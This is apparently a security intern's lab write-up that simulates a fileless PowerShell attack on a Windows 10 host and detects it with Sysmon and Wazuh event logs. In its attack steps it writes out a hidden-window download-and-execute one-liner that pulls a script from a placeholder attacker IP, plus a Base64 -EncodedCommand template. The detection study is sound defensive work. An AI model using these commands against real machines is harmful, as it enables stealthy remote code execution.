# Phase 3 ‚Äì Scenario 1: Fileless Malware with PowerShell

## üéØObjective:
Simulate and detect a fileless malware attack using PowerShell to execute a remote script payload without writing files to disk.

---

## Environment:
- **Victim**: Windows 10
- **Attacker**: Kali Linux
- **SIEM**: Wazuh (Amazon Linux OVA)

---

## Attack Simulation Steps:

### Step 1: Host the Payload on Kali
```bash
echo "Write-Output 'This is a simulated attack'" > fakepayload.ps1
sudo python3 -m http.server 8080
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_network_connection.png)

### Step 2: Run Fileless Payload on Windows
```powershell
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<Kali-IP>/fakepayload.ps1')"
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation.png)
> (Window closed automatically due to the -w hidden flag. Screenshot taken before execution for simulation purpose.)

### Step 3: Simulate Obfuscated Payload (Base64)
```powershell
powershell -EncodedCommand <Base64_Payload>
```
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_b64.png)

---

## Detection Logs:
Sysmon Logs:
- Event ID 1 (Process Creation)
  - Shows powershell.exe with suspicious flags (-nop, -EncodedCommand)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_sysmon1_log.png)
  - Captured by Wazuh
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_wazuh_log.png)
- Event ID 3 (Network Connection)
  - PowerShell connecting to Kali server (via port 8080)
  - Captured locally, not reflected in Wazuh dashboard (limitation)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_sysmon3_log.png)
- Event ID 10 (Script Block Logging)
  - Not observed (expected with -EncodedCommand)
- Event ID 4104 (PowerShell Logging)
  - Logged when running encoded payload
  - Confirms execution of base64-decoded script
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_powershell_log4104.png)
![](https://github.com/alj-v/cyber-intern-phase-3/blob/main/screenshots/hint01_fileless_malware_simulation_powershell_log.png)

---

#### ‚ö†Ô∏èLimitations:
- Wazuh agent misses Event ID 3 logs due to preconfigured Amazon Linux OVA limitations
- Network connection logs seen only in local Event Viewer
- PowerShell window closes automatically with -w hidden, screenshot taken before execution

---

#### Interview Notes:
Q: How do you detect fileless malware in Windows?
A: Monitor:
- Event ID 1: Look for PowerShell with suspicious arguments
- Event ID 3: Watch for outbound connections to external IPs
- Event ID 4104: Decode obfuscated commands
- Use SIEM like Wazuh/ELK to correlate behaviors.
